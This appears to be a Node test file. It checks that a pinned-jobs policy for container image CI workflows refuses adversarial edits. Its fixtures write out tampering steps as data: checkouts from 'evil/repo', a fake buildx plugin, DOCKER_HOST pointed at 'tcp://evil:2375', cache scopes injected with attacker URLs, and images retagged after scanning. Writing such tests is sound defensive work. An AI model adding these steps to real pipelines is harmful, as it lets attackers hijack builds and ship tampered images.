// Every job that builds, publishes, signs, attests, imports or tests an image is pinned in
// full in pinned-jobs.yaml (#488). Each fixture below is an edit an adversarial review made
// to a real workflow, which the earlier checks accepted.
import assert from "node:assert/strict";
import { test } from "node:test";
import { SHA, actionName, loadWorkflow, stepsOf } from "./lib.mjs";
import { PINNED_JOBS_FILE, currentPins, pinnedJobViolations, readPinnedJobs } from "./policy.mjs";

const CHECKOUT = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1";
const DOWNLOAD = "actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333";
const workflowNames = ["image", "branch-images", "loadtest-image", "oci-import", "prune-dev-images", "ci"];
const readMutated = (name, mutate) => {
  const all = Object.fromEntries(workflowNames.map(n => [`.github/workflows/${n}.yml`, structuredClone(loadWorkflow(n))]));
  mutate(all[`.github/workflows/${name}.yml`]);
  return file => all[file];
};
const indexOf = (job, action) => stepsOf(job).findIndex(s => actionName(s.uses ?? "") === action);
const beforeBuild = (data, job, step) => data.jobs[job].steps.splice(indexOf(data.jobs[job], "docker/build-push-action"), 0, step);
const afterScan = (data, step) => data.jobs["staging-image"].steps.splice(stepsOf(data.jobs["staging-image"]).findIndex(s => s.name === "Scan the candidate image and the arm64 runtime base") + 1, 0, step);
const refused = (name, mutate) => pinnedJobViolations(currentPins(readMutated(name, mutate)), readPinnedJobs());

test("the pinned jobs match the workflows", () => {
  assert.deepEqual(pinnedJobViolations(currentPins(), readPinnedJobs()), []);
});

const EDITS = [
  ["G: checkout of another repository over the workspace", "image", d => beforeBuild(d, "build", { uses: CHECKOUT, with: { repository: "evil/repo", path: "." } })],
  ["H: download-artifact from another repository", "ci", d => beforeBuild(d, "staging-image", { uses: DOWNLOAD, with: { repository: "evil/repo", "run-id": "1", "github-token": "${{ github.token }}" } })],
  ["F: printf over the Dockerfile", "branch-images", d => beforeBuild(d, "build", { run: "printf 'FROM alpine:latest\\n' > Dockerfile" })],
  ["X: a fake buildx plugin", "loadtest-image", d => beforeBuild(d, "build", { run: "mkdir -p ~/.docker/cli-plugins && cp tools/evil ~/.docker/cli-plugins/docker-buildx" })],
  ["X: a Docker config with currentContext", "image", d => beforeBuild(d, "build", { run: "echo '{\"currentContext\":\"evil\"}' > ~/.docker/config.json" })],
  ["E: a docker wrapper first on PATH", "ci", d => beforeBuild(d, "staging-image", { run: 'echo "$PWD/tools/bin" >> "$GITHUB_PATH"' })],
  ["D: DOCKER_HOST written in pieces to GITHUB_ENV", "ci", d => beforeBuild(d, "staging-image", { run: 'echo "DOCKER_""HOST=tcp://evil:2375" >> "$GITHUB_ENV"' })],
  ["P: PLATFORM_PAIR injecting url= into the cache scope", "image", d => beforeBuild(d, "build", { run: 'echo "PLATFORM_PAIR=x,url=https://evil.example" >> "$GITHUB_ENV"' })],
  ["A: docker pull and tag over the image under test after the scan", "ci", d => afterScan(d, { run: "docker pull alpine:latest && docker tag alpine:latest open-model-gateway:staging" })],
  ["B: docker load over the image under test after the scan", "ci", d => afterScan(d, { run: "docker load -i tools/evil.tar" })],
  ["B: skopeo retagging the image under test after the scan", "ci", d => afterScan(d, { run: "skopeo copy docker://alpine:latest docker-daemon:open-model-gateway:staging" })],
  ["C: a build through a variable command word", "ci", d => afterScan(d, { run: "d=docker; $d build -t open-model-gateway:staging ." })],
  ["I2: a python step that builds", "image", d => beforeBuild(d, "build", { shell: "python", run: "import subprocess; subprocess.run(['docker', 'build', '.'])" })],
  ["S: a custom step shell that is itself a build", "ci", d => afterScan(d, { shell: "docker build -t open-model-gateway:staging . && bash {0}", run: "true" })],
  ["a changed step input", "image", d => { d.jobs.build.steps[indexOf(d.jobs.build, "docker/build-push-action")].with["cache-from"] = "type=registry,ref=ghcr.io/evil/cache"; }],
  ["a removed step", "branch-images", d => { d.jobs.build.steps.splice(indexOf(d.jobs.build, "actions/upload-artifact"), 1); }],
  ["reordered steps", "loadtest-image", d => { const s = d.jobs.build.steps; [s[0], s[1]] = [s[1], s[0]]; }],
  ["another job permission", "image", d => { d.jobs.verify.permissions = { contents: "read", packages: "write" }; }],
  ["another job env", "ci", d => { d.jobs["staging-image"].env.DOCKER_HOST = "tcp://evil:2375"; }],
  ["another job container", "oci-import", d => { d.jobs.import.container = `mirror.gcr.io/library/alpine@sha256:${"a".repeat(64)}`; }],
  ["another matrix leg", "image", d => { d.jobs.build.strategy.matrix.include.push({ platform: "linux/s390x", runner: "ubuntu-24.04" }); }],
  ["another job output", "image", d => { d.jobs.build.outputs.extra = "${{ steps.x.outputs.y }}"; }],
  ["another workflow env", "image", d => { d.env.DOCKER_BUILDKIT = "0"; }],
  ["another workflow trigger", "branch-images", d => { d.on.pull_request_target = {}; }],
  ["a new job in a pinned workflow", "loadtest-image", d => { d.jobs.extra = { "runs-on": "ubuntu-24.04", steps: [{ run: "true" }] }; }],
  ["a removed pinned job", "ci", d => { delete d.jobs["staging-image"]; }],
  ["an action at another commit", "oci-import", d => { d.jobs.tools.steps[indexOf(d.jobs.tools, "actions/checkout")].uses = `actions/checkout@${SHA(7)}`; }],
];
for (const [label, name, mutate] of EDITS) {
  test(`a pinned image job refuses ${label}`, () => {
    const found = refused(name, mutate);
    assert.ok(found.length > 0 && found.every(v => v.includes(`update the pinned job in ${PINNED_JOBS_FILE}, which a reviewer must read`)), found.join("; "));
  });
}
